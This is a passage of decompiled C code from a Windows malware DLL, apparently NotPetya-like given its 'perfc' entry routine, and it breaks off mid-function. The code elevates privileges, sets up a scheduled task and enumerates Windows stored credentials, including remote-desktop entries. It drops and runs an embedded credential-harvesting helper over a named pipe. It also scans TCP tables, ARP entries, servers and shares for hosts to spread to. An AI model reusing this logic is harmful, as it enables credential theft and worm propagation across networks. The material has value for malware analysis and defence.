//----- (681F6F40) --------------------------------------------------------
_DWORD *__thiscall SomeHeapCleanupFunct(struct _RTL_CRITICAL_SECTION *this, __int16 *a2)
{
  _DWORD *result; // eax
  __int16 *v3; // edx
  __int16 *v4; // esi
  __int16 v5; // cx
  __int16 **v6; // [esp+4h] [ebp-4h]

  v6 = 0;
  result = GetHeapAndFreeIt(this, 0, &v6);
  if ( result )
  {
    v3 = *v6;
    v4 = a2;
    do
    {
      v5 = *v3;
      *v4 = *v3;
      ++v3;
      ++v4;
    }
    while ( v5 );
  }
  return result;
}

//----- (681F6F78) --------------------------------------------------------
BOOL __stdcall EnumProcessHeap(LPVOID lpMem)
{
  HANDLE v1; // eax

  v1 = GetProcessHeap();
  return HeapFree(v1, 0, lpMem);
}

//----- (681F6F91) --------------------------------------------------------
int __thiscall CheckCritSection(void *this, struct _RTL_CRITICAL_SECTION *a2, int *a3)
{
  int v3; // eax
  __int16 v4; // dx
  char v6[32]; // [esp+0h] [ebp-24h]
  int v7; // [esp+20h] [ebp-4h]

  v7 = 1;
  v3 = v6 - this;
  do
  {
    v4 = *this;
    *(this + v3) = *this;
    this = this + 2;
  }
  while ( v4 );
  return EnterAndLeaveCritSection(a2, a3, v6);
}
// 681F6F91: using guessed type char var_24[32];

//----- (681F6FC7) --------------------------------------------------------
int __userpurge sub_681F6FC7@<eax>(char *a1@<eax>, int a2@<esi>, struct _RTL_CRITICAL_SECTION *lpCriticalSection)
{
  int v3; // edx
  __int16 v4; // cx
  char Src[32]; // [esp+0h] [ebp-24h]
  int v7; // [esp+20h] [ebp-4h]

  if ( !a1 || !*a1 )
    return 0;
  v7 = a2;
  v3 = Src - a1;
  do
  {
    v4 = *a1;
    *&a1[v3] = *a1;
    a1 += 2;
  }
  while ( v4 );
  return EnumerateProcessHeap(lpCriticalSection, Src, a2);
}
// 681F6FC7: using guessed type char Src[32];

//----- (681F7003) --------------------------------------------------------
void __usercall EnterAndLeaveCritSection_5(int a1@<esi>)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  void (__stdcall *v3)(_DWORD); // ecx
  void *v4; // ST08_4
  HANDLE v5; // eax
  void *v6; // ST08_4
  HANDLE v7; // eax
  void *v8; // ST08_4
  HANDLE v9; // eax
  HANDLE v10; // eax
  unsigned int v11; // [esp+0h] [ebp-4h]

  if ( a1 )
  {
    if ( *(a1 + 24) )
    {
      v11 = 0;
      if ( *(a1 + 36) )
      {
        do
        {
          v1 = (*(a1 + 24) + 4 * v11);
          if ( *v1 )
          {
            v2 = *v1;
            if ( *v2 )
            {
              v3 = *(a1 + 48);
              if ( v3 )
                v3(*v2);
              v4 = **(*(a1 + 24) + 4 * v11);
              v5 = GetProcessHeap();
              HeapFree(v5, 0, v4);
            }
            v6 = *(*(a1 + 24) + 4 * v11);
            v7 = GetProcessHeap();
            HeapFree(v7, 0, v6);
          }
          ++v11;
        }
        while ( v11 < *(a1 + 36) );
      }
      v8 = *(a1 + 24);
      v9 = GetProcessHeap();
      HeapFree(v9, 0, v8);
    }
    v10 = GetProcessHeap();
    HeapFree(v10, 0, a1);
  }
}

//----- (681F7091) --------------------------------------------------------
struct _RTL_CRITICAL_SECTION *__stdcall sub_681F7091(LONG a1, ULONG_PTR a2, _RTL_CRITICAL_SECTION_DEBUG *a3, LONG a4)
{
  HANDLE v4; // eax
  struct _RTL_CRITICAL_SECTION *v5; // eax
  struct _RTL_CRITICAL_SECTION *v6; // esi
  HANDLE v7; // eax
  _RTL_CRITICAL_SECTION_DEBUG *v8; // eax

  v4 = GetProcessHeap();
  v5 = HeapAlloc(v4, 8u, 0x34u);
  v6 = v5;
  if ( v5 )
  {
    InitializeCriticalSection(v5);
    v6[1].RecursionCount = a4;
    v6[1].LockCount = a1;
    v6[1].SpinCount = a2;
    v6[1].OwningThread = 0;
    v6[2].DebugInfo = a3;
    v7 = GetProcessHeap();
    v8 = HeapAlloc(v7, 8u, 4 * a4);
    v6[1].DebugInfo = v8;
    if ( !v8 )
    {
      EnterAndLeaveCritSection_5(v6);
      v6 = 0;
    }
  }
  return v6;
}

//----- (681F70FA) --------------------------------------------------------
signed int __usercall EnterAndLeaveCritSection_4@<eax>(int a1@<esi>)
{
  if ( !a1 )
    return 0;
  EnterCriticalSection(a1);
  InterlockedExchange((a1 + 40), 1);
  LeaveCriticalSection(a1);
  return 1;
}

//----- (681F711F) --------------------------------------------------------
_DWORD *__userpurge GetHeapAndFreeIt@<eax>(struct _RTL_CRITICAL_SECTION *a1@<esi>, int a2, _DWORD *a3)
{
  HANDLE v3; // eax
  _DWORD *v4; // ebx
  void *v5; // ST08_4
  HANDLE v6; // eax

  v3 = GetProcessHeap();
  v4 = HeapAlloc(v3, 8u, 8u);
  if ( v4 )
  {
    *v4 = 0;
    v4[1] = a2;
    if ( !EnterAndLeaveCritSection_3(v4, a1, a3) )
    {
      v5 = v4;
      v4 = 0;
      v6 = GetProcessHeap();
      HeapFree(v6, 0, v5);
    }
  }
  return v4;
}

//----- (681F7167) --------------------------------------------------------
signed int __userpurge EnterAndLeaveCritSection_3@<eax>(int a1@<ebx>, struct _RTL_CRITICAL_SECTION *a2@<esi>, _DWORD *a3)
{
  signed int result; // eax
  signed int v4; // edi
  char *v5; // ecx
  int v6; // eax
  int v7; // edx

  result = 0;
  if ( a1 && a2 )
  {
    while ( 1 )
    {
      v4 = 0;
      EnterCriticalSection(a2);
      do
      {
        v5 = *a1;
        if ( *a1 >= a2[1].OwningThread )
          break;
        v6 = *(&a2[1].DebugInfo->Type + v5);
        v7 = *(v6 + 4);
        if ( !v7 || v7 & *(a1 + 4) )
        {
          v4 = 1;
          if ( a3 )
            *a3 = v6;
        }
        else
        {
          v4 = 0;
        }
        *a1 = v5 + 1;
      }
      while ( !v4 );
      LeaveCriticalSection(a2);
      result = v4;
      if ( v4 || a2[1].LockSemaphore )
        break;
      Sleep(0x2710u);
    }
  }
  return result;
}

//----- (681F71D6) --------------------------------------------------------
int __userpurge EnterAndLeaveCritSection_2@<eax>(unsigned int a1@<eax>, int a2@<esi>, int a3, _DWORD *a4)
{
  unsigned int v4; // ebx
  unsigned int v5; // edi
  int v7; // [esp+4h] [ebp-4h]

  v7 = 0;
  v4 = a1;
  if ( a2 )
  {
    EnterCriticalSection(a2);
    v5 = v4;
    if ( v4 < v4 + *(a2 + 36) )
    {
      while ( 1 )
      {
        v7 = (*(a2 + 44))(**(*(a2 + 24) + 4 * (v5 % *(a2 + 36))), a3, *(a2 + 28));
        if ( v7 )
          break;
        if ( ++v5 >= v4 + *(a2 + 36) )
          goto LABEL_8;
      }
      if ( a4 )
        *a4 = *(*(a2 + 24) + 4 * (v5 % *(a2 + 36)));
    }
LABEL_8:
    LeaveCriticalSection(a2);
  }
  return v7;
}

//----- (681F724D) --------------------------------------------------------
int __userpurge EnterAndLeaveCritSection@<eax>(struct _RTL_CRITICAL_SECTION *a1@<eax>, int *a2@<ebx>, int a3)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  int v4; // edi
  int v5; // eax
  int v7; // [esp+8h] [ebp-4h]

  v3 = a1;
  v4 = 0;
  if ( a1 )
  {
    EnterCriticalSection(a1);
    v5 = 0;
    v7 = 0;
    if ( a2 )
      v5 = *a2;
    v4 = EnterAndLeaveCritSection_2(v5, v3, a3, &v7);
    if ( v4 )
      *(v7 + 4) = 1;
    LeaveCriticalSection(v3);
  }
  return v4;
}

//----- (681F7298) --------------------------------------------------------
int __stdcall EnumerateProcessHeap(LPCRITICAL_SECTION lpCriticalSection, void *Src, int a3)
{
  HANDLE v3; // eax
  LPVOID v4; // eax
  LONG v5; // ST0C_4
  HANDLE v6; // eax
  LPVOID v7; // eax
  bool v8; // zf
  HANDLE v9; // eax
  PRTL_CRITICAL_SECTION_DEBUG v10; // ecx
  void *v11; // ST0C_4
  HANDLE v12; // eax
  SIZE_T v13; // ST0C_4
  PRTL_CRITICAL_SECTION_DEBUG v14; // ST08_4
  HANDLE v15; // eax
  _RTL_CRITICAL_SECTION_DEBUG *v16; // eax
  int v18; // [esp+8h] [ebp-4h]

  v18 = 0;
  if ( lpCriticalSection && Src )
  {
    EnterCriticalSection(lpCriticalSection);
    if ( !EnterAndLeaveCritSection_2(0, lpCriticalSection, Src, 0) )
    {
      if ( lpCriticalSection[1].OwningThread >= lpCriticalSection[1].RecursionCount )
      {
        v13 = 4 * lpCriticalSection[1].RecursionCount + 1020;
        v14 = lpCriticalSection[1].DebugInfo;
        v15 = GetProcessHeap();
        v16 = HeapReAlloc(v15, 8u, v14, v13);
        if ( v16 )
        {
          lpCriticalSection[1].DebugInfo = v16;
          lpCriticalSection[1].RecursionCount += 255;
          v18 = EnumerateProcessHeap(lpCriticalSection, Src, a3);
        }
      }
      else
      {
        v3 = GetProcessHeap();
        v4 = HeapAlloc(v3, 8u, 8u);
        *(&lpCriticalSection[1].DebugInfo->Type + lpCriticalSection[1].OwningThread) = v4;
        if ( v4 )
        {
          v5 = lpCriticalSection[1].LockCount;
          v6 = GetProcessHeap();
          v7 = HeapAlloc(v6, 8u, v5);
          **(&lpCriticalSection[1].DebugInfo->Type + lpCriticalSection[1].OwningThread) = v7;
          v8 = v7 == 0;
          v9 = lpCriticalSection[1].OwningThread;
          v10 = lpCriticalSection[1].DebugInfo;
          if ( v8 )
          {
            v11 = *(&v10->Type + v9);
            v12 = GetProcessHeap();
            HeapFree(v12, 0, v11);
          }
          else
          {
            *(*(&v10->Type + v9) + 4) = a3;
            memcpy(
              **(&lpCriticalSection[1].DebugInfo->Type + lpCriticalSection[1].OwningThread),
              Src,
              lpCriticalSection[1].LockCount);
            ++lpCriticalSection[1].OwningThread;
            v18 = 1;
          }
        }
      }
    }
    LeaveCriticalSection(lpCriticalSection);
  }
  return v18;
}

//----- (681F73AE) --------------------------------------------------------
signed int __userpurge CreateFileAndWrite@<eax>(const WCHAR *a1@<ebx>, LPCWSTR lpFileName, LPCVOID lpBuffer)
{
  signed int v3; // esi
  HANDLE v4; // edi

  v3 = 0;
  v4 = CreateFileW(lpFileName, 0x40000000u, 0, 0, 2u, 2u, 0);
  if ( v4 != -1 )
  {
    lpFileName = 0;
    if ( WriteFile(v4, lpBuffer, a1, &lpFileName, 0) && a1 == lpFileName )
      v3 = 1;
    CloseHandle(v4);
  }
  return v3;
}

//----- (681F73FD) --------------------------------------------------------
DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
{
  HANDLE v1; // eax
  void *v2; // eax
  HANDLE v3; // eax
  signed int v4; // edi
  DWORD v5; // ST1C_4
  HANDLE v6; // eax
  void *v7; // edi
  _WORD *v8; // eax
  HANDLE v9; // eax
  struct _SECURITY_ATTRIBUTES SecurityAttributes; // [esp+Ch] [ebp-18h]
  DWORD NumberOfBytesRead; // [esp+18h] [ebp-Ch]
  DWORD TotalBytesAvail; // [esp+1Ch] [ebp-8h]
  HANDLE hNamedPipe; // [esp+20h] [ebp-4h]

  SecurityAttributes.nLength = 12;
  SecurityAttributes.bInheritHandle = 0;
  v1 = GetProcessHeap();
  v2 = HeapAlloc(v1, 8u, 0x14u);
  SecurityAttributes.lpSecurityDescriptor = v2;
  if ( v2
    && InitializeSecurityDescriptor(v2, 1u)
    && SetSecurityDescriptorDacl(SecurityAttributes.lpSecurityDescriptor, 1, 0, 0) )
  {
    do
    {
LABEL_4:
      v3 = CreateNamedPipeW(lpThreadParameter, 3u, 6u, 1u, 0, 0, 0, &SecurityAttributes);
      hNamedPipe = v3;
    }
    while ( v3 == -1 );
    if ( !ConnectNamedPipe(v3, 0) )
      goto LABEL_19;
    v4 = 30;
    while ( 1 )
    {
      --v4;
      TotalBytesAvail = 0;
      if ( PeekNamedPipe(hNamedPipe, 0, 0, 0, &TotalBytesAvail, 0) )
      {
        if ( TotalBytesAvail )
        {
          v5 = TotalBytesAvail;
          v6 = GetProcessHeap();
          v7 = HeapAlloc(v6, 8u, v5);
          if ( v7 )
          {
            NumberOfBytesRead = 0;
            if ( ReadFile(hNamedPipe, v7, TotalBytesAvail, &NumberOfBytesRead, 0)
              && NumberOfBytesRead == TotalBytesAvail )
            {
              v8 = StrChrW(v7, 58);
              if ( v8 )
              {
                *v8 = 0;
                CleanUpHeaps(v7, v8 + 1, 2);
              }
            }
            v9 = GetProcessHeap();
            HeapFree(v9, 0, v7);
          }
LABEL_18:
          FlushFileBuffers(hNamedPipe);
          DisconnectNamedPipe(hNamedPipe);
LABEL_19:
          CloseHandle(hNamedPipe);
          goto LABEL_4;
        }
        Sleep(0x3E8u);
      }
      if ( !v4 )
        goto LABEL_18;
    }
  }
  return 0;
}
// 681FD234: using guessed type int __stdcall StrChrW(_DWORD, _DWORD);

//----- (681F7545) --------------------------------------------------------
int __usercall Enum64BitProcessAndComPipes@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>)
{
  HANDLE v2; // esi
  HMODULE v3; // eax
  FARPROC v4; // eax
  HRSRC v5; // eax
  int result; // eax
  int v7; // ecx
  _BYTE *i; // eax
  int v9; // ecx
  _BYTE *j; // eax
  void *v11; // ST28_4
  HANDLE v12; // eax
  WCHAR CommandLine; // [esp+8h] [ebp-1AA0h]
  WCHAR Parameter; // [esp+808h] [ebp-12A0h]
  WCHAR Buffer; // [esp+1008h] [ebp-AA0h]
  WCHAR TempFileName; // [esp+1418h] [ebp-690h]
  int Dst; // [esp+1A30h] [ebp-78h]
  __int16 v18; // [esp+1A60h] [ebp-48h]
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+1A74h] [ebp-34h]
  GUID pguid; // [esp+1A84h] [ebp-24h]
  HANDLE hThread; // [esp+1A94h] [ebp-14h]
  int v22; // [esp+1A98h] [ebp-10h]
  LPOLESTR lpsz; // [esp+1A9Ch] [ebp-Ch]
  LPVOID lpMem; // [esp+1AA0h] [ebp-8h]
  int v25; // [esp+1AA4h] [ebp-4h]

  lpMem = 0;
  v25 = 0;
  v2 = GetCurrentProcess();
  v22 = 0;
  v3 = GetModuleHandleW(L"kernel32.dll");
  v4 = GetProcAddress(v3, "IsWow64Process");
  if ( v4 )
    (v4)(v2, &v22);
  v5 = FindResourceW(Src, ((v22 != 0) + 1), 0xA);
  if ( v5 )
    result = LoadAndLock(&lpMem, a1, a2, &v25, v5);
  else
    result = 0;
  if ( result )
  {
    if ( GetTempPathW(0x208u, &Buffer) )
    {
      if ( GetTempFileNameW(&Buffer, 0, 0, &TempFileName) )
      {
        pguid.Data1 = 0;
        *&pguid.Data2 = 0;
        *pguid.Data4 = 0;
        *&pguid.Data4[4] = 0;
        if ( CoCreateGuid(&pguid) >= 0 )
        {
          lpsz = 0;
          if ( StringFromCLSID(&pguid, &lpsz) >= 0 )
          {
            if ( CreateFileAndWrite(v25, &TempFileName, lpMem) )
            {
              wsprintfW(&Parameter, L"\\\\.\\pipe\\%ws", lpsz);
              hThread = CreateThread(0, 0, StartAddress, &Parameter, 0, 0);
              if ( hThread )
              {
                ProcessInformation.hProcess = 0;
                ProcessInformation.hThread = 0;
                ProcessInformation.dwProcessId = 0;
                ProcessInformation.dwThreadId = 0;
                memset(&Dst, 0, 0x44u);
                v18 = 0;
                Dst = 68;
                wsprintfW(&CommandLine, L"\"%ws\" %ws", &TempFileName, &Parameter);
                if ( CreateProcessW(&TempFileName, &CommandLine, 0, 0, 0, 0x8000000u, 0, 0, &Dst, &ProcessInformation) )
                {
                  WaitForSingleObject(ProcessInformation.hProcess, 0xEA60u);
                  EnterAndLeaveCritSection_4(lpCriticalSection);
                  TerminateThread(hThread, 0);
                }
                CloseHandle(hThread);
              }
              v7 = v25;
              for ( i = lpMem; v7; --v7 )
                *i++ = 0;
              CreateFileAndWrite(v25, &TempFileName, lpMem);
              DeleteFileW(&TempFileName);
            }
            CoTaskMemFree(lpsz);
          }
        }
      }
    }
    v9 = v25;
    for ( j = lpMem; v9; --v9 )
      *j++ = 0;
    v11 = lpMem;
    v12 = GetProcessHeap();
    result = HeapFree(v12, 0, v11);
  }
  return result;
}

//----- (681F777B) --------------------------------------------------------
BOOL __stdcall EnumNetIPProtocols(int a1)
{
  BOOL v1; // ebx
  HMODULE v2; // eax
  FARPROC v3; // edi
  HANDLE v4; // eax
  unsigned int *v5; // esi
  int v6; // eax
  unsigned __int8 *v7; // edi
  HANDLE v8; // eax
  WCHAR v10; // [esp+4h] [ebp-50h]
  HMODULE hLibModule; // [esp+44h] [ebp-10h]
  unsigned int *v12; // [esp+48h] [ebp-Ch]
  int v13; // [esp+4Ch] [ebp-8h]
  unsigned int v14; // [esp+50h] [ebp-4h]

  v1 = 0;
  v2 = LoadLibraryW(L"iphlpapi.dll");
  hLibModule = v2;
  if ( v2 )
  {
    v3 = GetProcAddress(v2, "GetExtendedTcpTable");
    if ( v3 )
    {
      v13 = 0x100000;
      v4 = GetProcessHeap();
      v5 = HeapAlloc(v4, 8u, 0x100000u);
      v12 = v5;
      if ( v5 )
      {
        v6 = (v3)(v5, &v13, 0, 2, 1, 0);
        v1 = v6 == 0;
        if ( !v6 )
        {
          v14 = 0;
          if ( *v5 )
          {
            v7 = v5 + 18;
            do
            {
              if ( *(v7 - 14) == 5 )
              {
                wsprintfW(&v10, L"%u.%u.%u.%u", *(v7 - 2), *(v7 - 1), *v7, v7[1]);
                sub_681F6FC7(&v10, 0, a1);
                v5 = v12;
              }
              ++v14;
              v7 += 20;
            }
            while ( v14 < *v5 );
          }
        }
        v8 = GetProcessHeap();
        HeapFree(v8, 0, v5);
      }
    }
    else
    {
      GetLastError();
    }
    FreeLibrary(hLibModule);
  }
  return v1;
}

//----- (681F786B) --------------------------------------------------------
int __stdcall EnumNetIpServices(int a1)
{
  ULONG v1; // eax
  SIZE_T v3; // ST14_4
  HANDLE v4; // eax
  struct _MIB_IPNETTABLE *v5; // ebx
  const char *v6; // ebx
  HANDLE v7; // eax
  WCHAR v8; // [esp+8h] [ebp-54h]
  int v9; // [esp+48h] [ebp-14h]
  int v10; // [esp+4Ch] [ebp-10h]
  struct _MIB_IPNETTABLE *v11; // [esp+50h] [ebp-Ch]
  unsigned int v12; // [esp+54h] [ebp-8h]
  ULONG SizePointer; // [esp+58h] [ebp-4h]

  v10 = 0;
  SizePointer = 0;
  v1 = GetIpNetTable(0, &SizePointer, 0);
  if ( v1 == 232 )
    return 0;
  if ( v1 == 122 )
  {
    v3 = SizePointer;
    v4 = GetProcessHeap();
    v5 = HeapAlloc(v4, 0, v3);
    v11 = v5;
    if ( v5 )
    {
      if ( !GetIpNetTable(v5, &SizePointer, 0) )
      {
        v10 = 1;
        v12 = 0;
        if ( v5->dwNumEntries > 0 )
        {
          v9 = 3;
          v6 = &v5->table[0].dwAddr + 2;
          do
          {
            if ( !memcmp(v6 + 2, &v9, 4) )
            {
              wsprintfW(&v8, L"%u.%u.%u.%u", *(v6 - 2), *(v6 - 1), *v6, *(v6 + 1));
              sub_681F6FC7(&v8, 0, a1);
            }
            ++v12;
            v6 += 24;
          }
          while ( v12 < v11->dwNumEntries );
          v5 = v11;
        }
      }
      v7 = GetProcessHeap();
      HeapFree(v7, 0, v5);
    }
  }
  return v10;
}

//----- (681F795A) --------------------------------------------------------
LPCWSTR __stdcall EnumNetServers(int a1, DWORD servertype, LPCWSTR domain)
{
  DWORD v3; // eax
  DWORD v4; // ebx
  LPBYTE v5; // edi
  DWORD totalentries; // [esp+8h] [ebp-10h]
  DWORD resume_handle; // [esp+Ch] [ebp-Ch]
  DWORD entriesread; // [esp+10h] [ebp-8h]
  LPBYTE bufptr; // [esp+14h] [ebp-4h]
  LPCWSTR domaina; // [esp+28h] [ebp+10h]

  bufptr = 0;
  entriesread = 0;
  totalentries = 0;
  resume_handle = 0;
  v3 = NetServerEnum(0, 0x65u, &bufptr, 0xFFFFFFFF, &entriesread, &totalentries, servertype, domain, &resume_handle);
  if ( v3 && v3 != 234 )
  {
    domaina = 0;
  }
  else
  {
    domaina = 1;
    if ( !bufptr )
      return domaina;
    v4 = 0;
    if ( entriesread > 0 )
    {
      v5 = bufptr + 4;
      do
      {
        if ( v5 == 4 )
          break;
        if ( *(v5 + 3) >= 0 )
        {
          if ( *(v5 - 1) == 500 && (*(v5 + 1) & 0xFu) > 4 )
            sub_681F6FC7(*v5, 0, a1);
        }
        else
        {
          EnumNetServers(a1, 3u, *v5);
        }
        v5 += 24;
        ++v4;
      }
      while ( v4 < entriesread );
    }
  }
  if ( bufptr )
    NetApiBufferFree(bufptr);
  return domaina;
}

//----- (681F7A17) --------------------------------------------------------
int __stdcall EnumNetResources(int a1, LPNETRESOURCEW lpNetResource)
{
  char *v2; // esi
  DWORD v3; // eax
  int v4; // edi
  signed int v5; // ecx
  _WORD *v6; // eax
  __int16 v7; // si
  char *v9; // [esp+8h] [ebp-14h]
  HANDLE hEnum; // [esp+Ch] [ebp-10h]
  int v11; // [esp+10h] [ebp-Ch]
  DWORD cCount; // [esp+14h] [ebp-8h]
  SIZE_T dwBytes; // [esp+18h] [ebp-4h]
  LPNETRESOURCEW lpNetResourcea; // [esp+28h] [ebp+Ch]

  cCount = -1;
  v11 = 0;
  dwBytes = 0x4000;
  if ( !WNetOpenEnumW(1u, 0, 0, lpNetResource, &hEnum) )
  {
    v2 = GlobalAlloc(0x40u, dwBytes);
    v9 = v2;
    if ( v2 )
    {
      v11 = 1;
      while ( 1 )
      {
        memset(v2, 0, dwBytes);
        v3 = WNetEnumResourceW(hEnum, &cCount, v2, &dwBytes);
        if ( v3 )
          break;
        lpNetResourcea = 0;
        if ( cCount > 0 )
        {
          v4 = (v2 + 20);
          do
          {
            v5 = 2;
            if ( (*(v4 - 8) & 2) == 2 )
            {
              EnumNetResources(a1, (v4 - 20));
            }
            else
            {
              v6 = *v4;
              if ( *v4 && *v6 == 92 && v6[1] == 92 )
              {
                if ( v6[2] )
                {
                  v7 = v6[2];
                  do
                  {
                    if ( v7 == 92 )
                      break;
                    v7 = v6[++v5];
                  }
                  while ( v7 );
                }
                v6[v5] = 0;
                sub_681F6FC7((*v4 + 4), 0, a1);
                v2 = v9;
              }
            }
            lpNetResourcea = (lpNetResourcea + 1);
            v4 += 32;
          }
          while ( lpNetResourcea < cCount );
        }
      }
      if ( v3 != 259 )
        v11 = 0;
      GlobalFree(v2);
      WNetCloseEnum(hEnum);
    }
  }
  return v11;
}

//----- (681F7B31) --------------------------------------------------------
int __stdcall EnumerateWindowsCredentials(int a1)
{
  unsigned int v1; // eax
  int v2; // esi
  int v3; // eax
  char *v4; // edi
  const wchar_t *v5; // edx
  const wchar_t *v6; // ecx
  signed int v7; // ecx
  int v9; // [esp+4h] [ebp-14h]
  unsigned int v10; // [esp+8h] [ebp-10h]
  signed int v11; // [esp+Ch] [ebp-Ch]
  int v12; // [esp+10h] [ebp-8h]
  unsigned int v13; // [esp+14h] [ebp-4h]

  v12 = 0;
  v13 = 0;
  v9 = CredEnumerateW(0, 0, &v13, &v12);
  if ( v9 )
  {
    v1 = 0;
    v10 = 0;
    if ( v13 > 0 )
    {
      while ( 1 )
      {
        v2 = v12 + 4 * v1;
        v3 = *v2;
        v4 = *(*v2 + 8);
        if ( v4 )
        {
          v11 = 8;
          v5 = L"TERMSRV/";
          v6 = *(*v2 + 8);
          while ( *v6 == *v5 )
          {
            ++v6;
            ++v5;
            if ( !--v11 )
            {
              v7 = 0;
              goto LABEL_8;
            }
          }
          v7 = *v6 < *v5 ? -1 : 1;
LABEL_8:
          if ( v7 == 0 )
          {
            v4 += 16;
            if ( *(v3 + 4) == 1 )
              break;
          }
        }
        if ( *(v3 + 4) == 2 )
          goto LABEL_15;
LABEL_16:
        v1 = v10 + 1;
        v10 = v1;
        if ( v1 >= v13 )
          goto LABEL_17;
      }
      if ( *(v3 + 48) && *(v3 + 28) )
        CleanUpHeaps(*(v3 + 48), *(v3 + 28), 0);
LABEL_15:
      sub_681F6FC7(v4, 0, a1);
      goto LABEL_16;
    }
LABEL_17:
    CredFree(v12);
  }
  return v9;
}
// 681FD040: using guessed type int __stdcall CredEnumerateW(_DWORD, _DWORD, _DWORD, _DWORD);
// 681FD044: using guessed type int __stdcall CredFree(_DWORD);
// 682040BC: using guessed type wchar_t aTermsrv[9];

//----- (681F7C10) --------------------------------------------------------
void __stdcall __noreturn GetPhysicalNetBiosAndWait(LPVOID lpThreadParameter)
{
  struct _RTL_CRITICAL_SECTION *v1; // edi
  signed int v2; // esi
  WCHAR Buffer; // [esp+Ch] [ebp-20Ch]
  DWORD nSize; // [esp+214h] [ebp-4h]

  v1 = lpParameter;
  sub_681F6FC7(L"127.0.0.1", 1, lpParameter);
  sub_681F6FC7(L"localhost", 1, v1);
  nSize = 260;
  if ( GetComputerNameExW(ComputerNamePhysicalNetBIOS, &Buffer, &nSize) )
    sub_681F6FC7(&Buffer, 1, v1);
  CreateThread(0, 0, GetNetworkInterfaces, v1, 0, 0);
  v2 = 0;
  while ( 1 )
  {
    EnumNetIPProtocols(v1);
    EnumNetIpServices(v1);
    if ( !v2 )
    {
      EnumNetServers(v1, 0x80000000, 0);
      v2 = 1;
    }
    Sleep(0x2BF20u);
  }
}
// 682040E4: using guessed type wchar_t aLocalhost[10];

//----- (681F7CA5) --------------------------------------------------------
bool __stdcall CompareMemoryAllocs(const void *a1, const void *a2, unsigned int a3)
{
  return memcmp(a1, a2, a3) == 0;
}

//----- (681F7CC0) --------------------------------------------------------
void PerformPrivChecks()
{
  signed int PrivLevel; // esi

  PrivLevel = 0;
  if ( !PrivCheckCompleted )
  {
    TickCountTime = GetTickCount();
    if ( CheckPrivsAdjustTokens(L"SeShutdownPrivilege") )
      PrivLevel = 1;
    if ( CheckPrivsAdjustTokens(L"SeDebugPrivilege") )
      PrivLevel |= 2u;
    if ( CheckPrivsAdjustTokens(L"SeTcbPrivilege") )
      PrivLevel |= 4u;
    gPrivLevel = PrivLevel;
    EnumeratedProcessesHandle = EnumerateProcesses();
    if ( GetModuleFileNameW(Src, &pszPath, 0x30Cu) )
      CreateSomeFile();
  }
}
// 6820F104: using guessed type int EnumeratedProcessesHandle;
// 6820F114: using guessed type int PrivCheckCompleted;
// 6820F118: using guessed type int TickCountTime;
// 6820F144: using guessed type int gPrivLevel;

//----- (681F7D39) --------------------------------------------------------
BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  if ( fdwReason == 1 )
  {
    Src = hinstDLL;
    DisableThreadLibraryCalls(hinstDLL);
  }
  return 1;
}

//----- (681F7D58) --------------------------------------------------------
DWORD __stdcall SetThreadParam(LPVOID lpThreadParameter)
{
  signed int v1; // eax

  v1 = CheckSecurityAuthorityAndTokens();
  if ( lpThreadParameter )
    *lpThreadParameter = v1;
  return 0;
}

//----- (681F7D6F) --------------------------------------------------------
signed int __userpurge SelfLocalHostCheck@<eax>(__m64 mm0_0@<mm0>, __m64 a2@<mm1>, const unsigned __int16 *a1)
{
  signed int v3; // esi
  WCHAR pszPath; // [esp+4h] [ebp-618h]

  v3 = 0;
  if ( dword_6820F0FC )
  {
    if ( dword_6820F11C )
    {
      if ( SetWideAddress(mm0_0, a2, L"127.0.0.1", a1, wcslen(a1)) )
      {
        Sleep(0xBB8u);
        if ( PathCombineWithCWindows(&pszPath) )
        {
          if ( PathFileExistsW(&pszPath) )
            v3 = 1;
        }
      }
    }
  }
  return v3;
}

//----- (681F7DEB) --------------------------------------------------------
void __usercall __noreturn perfc_1(__m64 a1@<mm0>, __m64 a2@<mm1>, int a3, DWORD dwErrCode, HANDLE Thread, HANDLE hThread)
{
  int v6; // eax
  HANDLE *v7; // esi
  HANDLE v8; // eax
  _DWORD *v9; // eax
  HANDLE v10; // ST14_4
  HANDLE v11; // eax
  HMODULE v12; // eax
  FARPROC v13; // eax
  unsigned __int16 v14[8192]; // [esp+Ch] [ebp-4A18h]
  WCHAR v15; // [esp+400Ch] [ebp-A18h]
  __int16 v16; // [esp+480Ah] [ebp-21Ah]
  char Src; // [esp+480Ch] [ebp-218h]
  int Dst; // [esp+490Ch] [ebp-118h]
  int v19; // [esp+4910h] [ebp-114h]
  int v20; // [esp+4914h] [ebp-110h]
  HANDLE Token; // [esp+4A20h] [ebp-4h]

  PerformPrivChecks();
  if ( hThread != -1 )
    SetVirtualAttributes(a3, dwErrCode, Thread);
  WSAStartup(0x202u, &stru_6820F768);
  lpParameter = sub_681F7091(36, CompareStringsW, 0, 0xFFFF);
  lpCriticalSection = sub_681F7091(8, CompareStringsW_2, CleanUpHeaps_3, 255);
  dword_6820F110 = 0;
  InitializeCriticalSection(&CriticalSection);
  CheckCmdLineArgs(Thread);
  if ( gPrivLevel & 2 )
  {
    SomeFileCheck();
    SetLockAtCDir();
  }
  CreateScheduledTaskAsAdmin();
  CreateThread(0, 0, GetPhysicalNetBiosAndWait, 0, 0, 0);
  if ( gPrivLevel & 2 && EnumeratedProcessesHandle & 1 )
    Enum64BitProcessAndComPipes(a1, a2);
  EnterAndLeaveCritSection_4(lpCriticalSection);
  if ( EnumeratedProcessesHandle & 2 )
    GetDllHostData(a1, a2, gPrivLevel & 6);
  if ( !(gPrivLevel & 4)
    || (dword_6820F110 = sub_681F7091(4, CompareMemoryAllocs, 0, 255), (v6 = EnumerateProcessesAndTokens(&Src)) == 0) )
  {
LABEL_29:
    EnterAndLeaveCritSection_4(dword_6820F110);
    CreateThread(0, 0, sub_681FA0FE, 0, 0, 0);
    hThread = 0;
    a3 = 0;
    Thread = 0;
    dwErrCode = 0;
    GetNetServerInfo(&hThread, &a3, &Thread, &dwErrCode);
    v8 = GetProcessHeap();
    v9 = HeapAlloc(v8, 8u, 4u);
    Token = v9;
    if ( v9 )
    {
      *v9 = 60000 * Thread;
      if ( !CreateThread(0, 0, SleepAndFreeHeap, v9, 0, 0) )
      {
        v10 = Token;
        v11 = GetProcessHeap();
        HeapFree(v11, 0, v10);
      }
